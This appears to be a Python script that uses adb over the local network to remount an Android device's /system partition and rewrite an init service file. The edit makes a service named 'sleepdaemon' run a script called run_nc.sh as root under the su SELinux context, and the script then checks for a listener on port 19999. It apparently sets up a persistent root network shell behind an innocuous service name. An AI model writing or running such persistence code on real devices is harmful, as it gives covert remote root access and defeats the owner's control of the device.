import subprocess
import time
import socket

adb = r'C:\Users\jigu\AppData\Local\Android\Sdk\platform-tools\adb.exe'
dev = '192.168.31.115:5555'

def run(cmd_args, timeout=10):
    subprocess.run([adb, 'connect', dev], capture_output=True, text=True)
    full_cmd = [adb, '-s', dev] + cmd_args
    r = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
    return r.stdout, r.stderr

print("[*] 1. Remounting /system...")
out, err = run(['shell', 'mount -o remount,rw /system'])
print("    remount:", out, err)

print("[*] 2. Checking sleepdaemon.rc and daemonsu.rc before:")
out, _ = run(['shell', 'cat /system/etc/init/sleepdaemon.rc'])
print(out)

# Replace seclabel u:r:adbd:s0 with seclabel u:r:su:s0
new_rc = """service sleepdaemon /system/bin/sh /system/bin/run_nc.sh
    class main
    user root
    group root
    seclabel u:r:su:s0
"""
run(['shell', f"echo '{new_rc}' > /system/etc/init/sleepdaemon.rc"])

print("[*] 3. Content of sleepdaemon.rc after update:")
out, _ = run(['shell', 'cat /system/etc/init/sleepdaemon.rc'])
print(out)

print("[*] 4. Restarting sleepdaemon service...")
run(['shell', 'stop sleepdaemon'])
time.sleep(1)
run(['shell', 'start sleepdaemon'])
time.sleep(2)

print("[*] 5. Status of sleepdaemon:")
out, _ = run(['shell', 'getprop init.svc.sleepdaemon'])
print("    init.svc.sleepdaemon:", out.strip())

print("[*] 6. Check netstat for 19999:")
out, _ = run(['shell', 'netstat -tlpn | grep 19999'])
print("    netstat:", out.strip())

print("[*] 7. Check dmesg for new init logs:")
out, _ = run(['shell', 'dmesg | tail -n 15'])
print("    dmesg:\n", out)
